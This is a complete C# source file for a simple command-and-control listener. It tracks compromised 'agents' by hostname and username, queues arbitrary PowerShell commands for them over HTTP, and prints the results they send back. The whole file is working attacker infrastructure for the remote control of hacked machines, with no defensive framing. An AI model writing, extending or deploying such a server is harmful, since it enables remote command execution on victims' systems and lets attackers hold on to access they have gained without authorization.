using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace SimpleC2Listener
{
    // Data classes
    public class CheckinRequest
    {
        public string AgentId { get; set; }
        public string Hostname { get; set; }
        public string Username { get; set; }
        public string OS { get; set; }
    }

    public class CheckinResponse
    {
        public string Command { get; set; }
        public string CommandId { get; set; }
    }

    public class ResultsRequest
    {
        public string AgentId { get; set; }
        public string CommandId { get; set; }
        public string Output { get; set; }
        public bool Success { get; set; }
    }

    public class PendingCommand
    {
        public string CommandId { get; set; }
        public string Command { get; set; }
        public DateTime CreatedAt { get; set; }
    }

    public class AgentInfo
    {
        public string AgentId { get; set; }
        public string Hostname { get; set; }
        public string Username { get; set; }
        public string OS { get; set; }
        public DateTime LastSeen { get; set; }
    }

    class Program
    {
        private static readonly ConcurrentDictionary<string, PendingCommand> commandQueue =
            new ConcurrentDictionary<string, PendingCommand>();
        private static readonly ConcurrentDictionary<string, AgentInfo> agentSessions =
            new ConcurrentDictionary<string, AgentInfo>();
        private static readonly ConcurrentDictionary<string, string> commandResults =
            new ConcurrentDictionary<string, string>();

        static void Main(string[] args)
        {
            Console.WriteLine("=== Simple C2 Listener Started ===");
            Console.WriteLine("Starting HTTP listener on http://localhost:8080/");
            Console.WriteLine("Commands:");
            Console.WriteLine("  list agents    - Show active agents");
            Console.WriteLine("  cmd <agent> <command> - Send PowerShell command to agent");
            Console.WriteLine("  exit          - Shut down server");
            Console.WriteLine();

            // Start HTTP listener in background
            Task.Run(() => StartHttpListener());

            // Console interface
            while (true)
            {
                Console.Write("C2> ");
                var input = Console.ReadLine()?.Trim();

                if (string.IsNullOrEmpty(input))
                    continue;

                var parts = input.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                var command = parts[0].ToLower();

                switch (command)
                {
                    case "exit":
                        Console.WriteLine("Shutting down...");
                        Environment.Exit(0);
                        break;

                    case "list":
                        if (parts.Length > 1 && parts[1].ToLower() == "agents")
                        {
                            ListAgents();
                        }
                        break;

                    case "cmd":
                        if (parts.Length < 3)
                        {
                            Console.WriteLine("Usage: cmd <agent_id> <powershell_command>");
                            break;
                        }

                        var targetAgent = parts[1];
                        var psCommand = string.Join(" ", parts, 2, parts.Length - 2);
                        var commandId = Guid.NewGuid().ToString("N").Substring(0, 8);

                        commandQueue[targetAgent] = new PendingCommand
                        {
                            CommandId = commandId,
                            Command = psCommand,
                            CreatedAt = DateTime.UtcNow
                        };

                        Console.WriteLine($"Command queued for agent {targetAgent}: {psCommand}");
                        Console.WriteLine($"Command ID: {commandId}");
                        break;

                    default:
                        Console.WriteLine("Unknown command. Available commands: list agents, cmd <agent> <command>, exit");
                        break;
                }
            }
        }

        static void ListAgents()
        {
            var activeAgents = new List<AgentInfo>();
            foreach (var agent in agentSessions.Values)
            {
                if (DateTime.UtcNow - agent.LastSeen < TimeSpan.FromMinutes(10))
                {
                    activeAgents.Add(agent);
                }
            }

            if (activeAgents.Count > 0)
            {
                Console.WriteLine("Active Agents:");
                foreach (var agent in activeAgents)
                {
                    Console.WriteLine($"  {agent.AgentId} - {agent.Hostname} ({agent.Username}) - Last seen: {agent.LastSeen:HH:mm:ss}");
                }
            }
            else
            {
                Console.WriteLine("No active agents.");
            }
        }

        static void StartHttpListener()
        {
            var listener = new HttpListener();
            listener.Prefixes.Add("http://*:8080/");

            try
            {
                listener.Start();
                Console.WriteLine("HTTP listener started successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to start HTTP listener: {ex.Message}");
                Console.WriteLine("Try running as Administrator or use a different port.");
                return;
            }

            while (true)
            {
                try
                {
                    var context = listener.GetContext();
                    Task.Run(() => HandleRequest(context));
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Listener error: {ex.Message}");
                }
            }
        }

        static void HandleRequest(HttpListenerContext context)
        {
            var request = context.Request;
            var response = context.Response;

            try
            {
                if (request.HttpMethod == "POST" && request.Url.AbsolutePath == "/checkin")
                {
                    HandleCheckin(request, response);
                }
                else if (request.HttpMethod == "POST" && request.Url.AbsolutePath == "/results")
                {
                    HandleResults(request, response);
                }
                else if (request.HttpMethod == "GET" && request.Url.AbsolutePath == "/agents")
                {
                    HandleAgentsList(response);
                }
                else
                {
                    response.StatusCode = 404;
                    response.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Request handling error: {ex.Message}");
                response.StatusCode = 500;
                response.Close();
            }
        }

        static void HandleCheckin(HttpListenerRequest request, HttpListenerResponse response)
        {
            string requestBody = new StreamReader(request.InputStream).ReadToEnd();
            var checkinRequest = JsonConvert.DeserializeObject<CheckinRequest>(requestBody);

            if (checkinRequest == null)
            {
                response.StatusCode = 400;
                response.Close();
                return;
            }

            var agentId = checkinRequest.AgentId;

            // Update agent info
            agentSessions[agentId] = new AgentInfo
            {
                AgentId = checkinRequest.AgentId,
                Hostname = checkinRequest.Hostname,
                Username = checkinRequest.Username,
                OS = checkinRequest.OS,
                LastSeen = DateTime.UtcNow
            };

            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Agent {agentId} checked in from {checkinRequest.Hostname}");

            // Check for pending commands
            var checkinResponse = new CheckinResponse();
            if (commandQueue.TryRemove(agentId, out var pendingCommand))
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Sending command to {agentId}: {pendingCommand.Command}");
                checkinResponse.Command = pendingCommand.Command;
                checkinResponse.CommandId = pendingCommand.CommandId;
            }

            // Send response
            var responseJson = JsonConvert.SerializeObject(checkinResponse);
            var responseBytes = Encoding.UTF8.GetBytes(responseJson);

            response.ContentType = "application/json";
            response.ContentLength64 = responseBytes.Length;
            response.StatusCode = 200;

            response.OutputStream.Write(responseBytes, 0, responseBytes.Length);
            response.Close();
        }

        static void HandleResults(HttpListenerRequest request, HttpListenerResponse response)
        {
            string requestBody = new StreamReader(request.InputStream).ReadToEnd();
            var resultsRequest = JsonConvert.DeserializeObject<ResultsRequest>(requestBody);

            if (resultsRequest != null)
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Results from {resultsRequest.AgentId}:");
                Console.WriteLine($"Command ID: {resultsRequest.CommandId}");
                Console.WriteLine($"Success: {resultsRequest.Success}");
                Console.WriteLine($"Output:\n{resultsRequest.Output}");
                Console.WriteLine(new string('-', 50));

                commandResults[resultsRequest.CommandId] = resultsRequest.Output;
            }

            response.StatusCode = 200;
            response.Close();
        }

        static void HandleAgentsList(HttpListenerResponse response)
        {
            var activeAgents = new List<AgentInfo>();
            foreach (var agent in agentSessions.Values)
            {
                if (DateTime.UtcNow - agent.LastSeen < TimeSpan.FromMinutes(10))
                {
                    activeAgents.Add(agent);
                }
            }

            var responseJson = JsonConvert.SerializeObject(activeAgents);
            var responseBytes = Encoding.UTF8.GetBytes(responseJson);

            response.ContentType = "application/json";
            response.ContentLength64 = responseBytes.Length;
            response.StatusCode = 200;

            response.OutputStream.Write(responseBytes, 0, responseBytes.Length);
            response.Close();
        }
    }
}